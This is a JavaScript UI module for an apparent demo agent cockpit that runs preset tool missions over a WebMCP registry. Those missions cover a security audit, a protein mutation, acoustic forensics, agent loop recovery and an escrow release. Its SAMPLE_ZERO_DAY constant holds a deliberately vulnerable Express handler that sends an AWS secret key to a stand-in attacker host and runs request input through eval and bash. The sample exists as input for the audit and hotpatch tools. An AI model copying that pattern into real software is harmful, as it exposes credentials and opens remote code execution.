/* =============================================================================
   SENTINEL Agent Cockpit.

   A deterministic mission planner over the WebMCP registry. It matches a prompt
   to a plan, then executes each step through `document.modelContext` and prints
   the real result — the transcript is a record of actual tool output, never a
   scripted reply.
   ========================================================================== */

import { $, el, fill, fmt, toast, reduceMotion } from './ui.js';
import { webmcp } from './webmcp.js';

const SAMPLE_ZERO_DAY = `const express = require('express');
const { execSync } = require('child_process');

app.post('/api/webhook', (req, res) => {
  const payload = req.query.cmd;
  const token = process.env.AWS_SECRET_ACCESS_KEY;
  fetch("https://evil-cve-stealer.internal/leak?k=" + token);
  const result = eval(payload);
  execSync("bash -c '" + req.body.script + "'");
});`;

/* ------------------------------------------------------------------ plans */

/**
 * Mission plans. Each step names a tool, its arguments, and how to narrate the
 * result — the narration reads from the real response, so it cannot drift from
 * what the tool actually did.
 */
const MISSIONS = [
  {
    id: 'breach',
    match: /zero-?day|audit|vulnerab|patch|cve|exploit|security/i,
    label: 'Audit a zero-day',
    prompt: 'Audit the repository for a zero-day supply-chain vulnerability and synthesise a hotpatch.',
    intro: 'Parsing the AST for remote code execution and credential exfiltration sinks…',
    steps: [
      {
        tool: 'breachlab_analyze_cve_ast',
        args: { codeOrManifest: SAMPLE_ZERO_DAY, checkSupplyChain: true },
        say: (r) =>
          `AST inspection complete. Threat score ${r.threatScore}/100 [${r.verdict}] across ${r.findings.length} finding(s); ${r.astMetrics.dangerousCallsCount} dangerous call(s), entropy ${r.astMetrics.entropy}.`,
      },
      {
        tool: 'breachlab_trace_taint_flow',
        args: { code: SAMPLE_ZERO_DAY },
        say: (r) =>
          r.isVulnerable
            ? `Taint reaches an execution sink. Tracked variables: ${r.taintedVariables.join(', ') || 'none'}.`
            : 'No source-to-sink path found in this sample.',
      },
      {
        tool: 'breachlab_generate_hotpatch',
        args: { code: SAMPLE_ZERO_DAY },
        say: (r) =>
          `Hotpatch synthesised: ${r.fixesApplied.length} fix(es), security score +${r.securityScoreImprovement}. Dangerous sinks neutralised.`,
      },
    ],
  },
  {
    id: 'bio',
    match: /crispr|mutat|protein|residue|pdb|molecul|pocket/i,
    label: 'Simulate a mutation',
    prompt: 'Simulate a CRISPR point mutation on chain A residue 2 to TRP and scan for binding pockets.',
    intro: 'Loading Crambin 1CRN crystallographic coordinates…',
    steps: [
      {
        tool: 'biosynth_load_pdb_structure',
        args: {},
        say: (r) => `Structure parsed: ${r.atoms.length} atoms across ${r.sequence.length} residues.`,
      },
      {
        tool: 'biosynth_mutate_residue',
        args: { chain: 'A', resSeq: 2, targetResidue3: 'TRP' },
        say: (r) =>
          `Mutation ${r.originalResidue}→${r.mutatedResidue} simulated. ΔΔG ${r.deltaDeltaG} kcal/mol [${r.stabilityVerdict}] with ${r.stericClashes.length} steric clash(es).`,
      },
      {
        tool: 'biosynth_highlight_binding_pockets',
        args: {},
        say: (r) =>
          `${r.length} druggable cavity/ies found; best druggability ${Math.max(0, ...r.map((p) => p.druggabilityScore))}.`,
      },
    ],
  },
  {
    id: 'chrono',
    match: /drone|acoustic|triangulat|forensic|osint|audio|bodycam|incident/i,
    label: 'Reconstruct an incident',
    prompt: 'Align the drone and bodycam streams, triangulate the acoustic origin, and seal the dossier.',
    intro: 'Retrieving multi-angle spatial and acoustic sensor streams…',
    steps: [
      {
        tool: 'chrono_load_media_streams',
        args: {},
        say: (r) => `${r.length} sensor stream(s) retrieved: ${r.map((f) => f.cameraType).join(', ')}.`,
      },
      {
        tool: 'chrono_triangulate_acoustic_source',
        args: {},
        say: (r) =>
          `TDOA converged on (${r.estimatedSourceLocation.x}, ${r.estimatedSourceLocation.y}, ${r.estimatedSourceLocation.z}) with ±${r.confidenceRadiusMeters}m confidence from ${r.sensorCount} sensors.`,
      },
      {
        tool: 'chrono_generate_forensic_dossier',
        args: { incidentId: 'INC-COCKPIT-01' },
        say: (r) =>
          `Dossier sealed with SHA-256 ${r.forensicHash.slice(0, 16)}… across ${r.timelineSequence.length} timeline event(s).`,
      },
    ],
  },
  {
    id: 'meta',
    match: /loop|swarm|drift|fork|trace|agent debug|token/i,
    label: 'Break a trapped loop',
    prompt: 'Detect the infinite tool loop in the swarm trace and fork a recovery branch.',
    intro: 'Inspecting the swarm execution trace tree for cognitive drift…',
    steps: [
      {
        tool: 'metaloop_inspect_trace_tree',
        args: {},
        say: (r) =>
          `Trace inspected: ${r.totalSteps} steps, ${r.totalTokens} tokens, health ${r.healthScore}%. ${r.anomalies.length} anomaly/ies detected.`,
      },
      {
        tool: 'metaloop_inject_synthetic_tool',
        args: {
          forkPointStepId: 'step_2',
          syntheticToolName: 'search_nvd_database',
          syntheticOutput: { status: 'CACHE_RESOLVED', safeVersion: '4.17.22' },
        },
        say: (r) => `Recovery branch ${r.newBranchId} active — status ${r.recoveryStatus}.`,
      },
      {
        tool: 'metaloop_mitigate_drift',
        args: {},
        say: (r) => `Corrective steering issued: ${r.recoveryAction}.`,
      },
    ],
  },
  {
    id: 'escrow',
    match: /escrow|deliverable|release|milestone|contract|payout|hash/i,
    label: 'Verify &amp; release escrow',
    prompt: 'Verify the contractor deliverable against the milestone digest and sign the release.',
    intro: 'Computing the SHA-256 deliverable fingerprint…',
    steps: [
      {
        tool: 'zkescrow_verify_deliverable_hash',
        args: {
          milestoneId: 'M-1',
          submittedContent: 'function patchVulnerability(ast) { return sanitize(ast); }',
        },
        say: (r) =>
          `Digest ${r.hashMatch ? 'matched' : 'MISMATCHED'} (${r.actualSha256.slice(0, 12)}…). Verdict: ${r.arbitrationVerdict.replace(/_/g, ' ')}.`,
      },
      {
        tool: 'zkescrow_sign_escrow_release',
        args: { milestoneId: 'M-1' },
        say: (r) =>
          `Funds released: $${r.releasedAmountUsd} USD. Arbiter proof ${r.arbiterSignature.slice(0, 28)}…`,
      },
    ],
  },
];

/* ---------------------------------------------------------------- stream */

const streamNode = () => $('#stream');

function scrollToEnd() {
  const stream = streamNode();
  if (stream) stream.scrollTop = stream.scrollHeight;
}

/** Append a message. Text is always set via textContent, never innerHTML. */
function say(role, text, toolCall) {
  const stream = streamNode();
  if (!stream) return;

  const node = el('div', { class: `msg ${role}` }, [
    el('div', { class: 'msg-meta', text: role === 'user' ? 'OPERATOR' : 'WEBMCP AGENT' }),
    el('div', { class: 'msg-body', text }),
  ]);

  if (toolCall) {
    node.append(
      el('div', { class: 'tool-call' }, [
        el('header', {}, [
          document.createTextNode('invokeTool'),
          el('code', { text: toolCall.name }),
        ]),
        el('pre', { text: fmt.json(toolCall.result) }),
      ]),
    );
  }

  stream.append(node);
  scrollToEnd();
  return node;
}

const wait = (ms) =>
  new Promise((resolve) => setTimeout(resolve, reduceMotion ? 0 : ms));

/* -------------------------------------------------------------- planning */

function planFor(prompt) {
  return MISSIONS.find((mission) => mission.match.test(prompt)) || null;
}

let running = false;

async function runMission(prompt) {
  if (running) {
    toast('A mission is already running');
    return;
  }
  running = true;
  const sendBtn = $('#btnSend');
  if (sendBtn) sendBtn.disabled = true;
  setStatus('running', 'warn');

  say('user', prompt);

  const mission = planFor(prompt);
  if (!mission) {
    await wait(240);
    say(
      'agent',
      `No preset plan matches that request. ${webmcp.registeredCount} tools are registered and callable — try one of the preset missions, or mention a module (audit, protein, triangulate, loop, escrow).`,
    );
    finish();
    return;
  }

  await wait(220);
  say('agent', mission.intro);

  for (const step of mission.steps) {
    await wait(360);
    try {
      const result = await webmcp.invoke(step.tool, step.args);
      say('agent', step.say(result), { name: step.tool, result });
    } catch (error) {
      say(
        'agent',
        `Tool ${step.tool} refused: ${error && error.message ? error.message : 'unknown error'}`,
      );
    }
  }

  await wait(200);
  say('agent', 'Mission complete. All steps executed against the live tool registry.');
  finish();

  function finish() {
    running = false;
    if (sendBtn) sendBtn.disabled = false;
    setStatus(`${webmcp.registeredCount} tools ready`, 'ok');
  }
}

function setStatus(text, level) {
  const node = $('#cockpitStatusText');
  if (node) node.textContent = text;
  const wrap = $('#cockpitStatus');
  if (wrap) wrap.setAttribute('data-level', level);
}

/* ------------------------------------------------------------------ boot */

function renderSidebar() {
  const count = $('#toolCount');
  if (count) count.textContent = String(webmcp.registeredCount);

  fill(
    $('#toolTags'),
    webmcp.toolNames.map((name) => el('code', { text: name, title: name })),
  );

  const surface = $('#protoSurface');
  if (surface) surface.textContent = webmcp.polyfilled ? 'polyfill' : 'native';

  fill(
    $('#missionList'),
    MISSIONS.map((mission) =>
      el(
        'button',
        {
          class: 'mission',
          type: 'button',
          onclick: () => runMission(mission.prompt),
        },
        [
          el('b', { text: mission.label.replace(/&amp;/g, '&') }),
          document.createTextNode(mission.prompt),
        ],
      ),
    ),
  );
}

function start() {
  renderSidebar();
  setStatus(`${webmcp.registeredCount} tools ready`, 'ok');

  say(
    'agent',
    `Cockpit online. ${webmcp.registeredCount} WebMCP tools registered across 5 modules via document.modelContext (${webmcp.polyfilled ? 'polyfill' : 'native'}). Pick a preset mission or describe one.`,
  );

  const promptBox = $('#prompt');
  const send = () => {
    const text = (promptBox?.value || '').trim();
    if (!text) return;
    promptBox.value = '';
    runMission(text);
  };

  $('#btnSend')?.addEventListener('click', send);
  promptBox?.addEventListener('keydown', (event) => {
    if ((event.metaKey || event.ctrlKey) && event.key === 'Enter') {
      event.preventDefault();
      send();
    }
  });

  $('#btnClear')?.addEventListener('click', () => {
    fill(streamNode(), []);
    say('agent', 'Stream cleared. Tools remain registered.');
  });
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', start, { once: true });
} else {
  start();
}
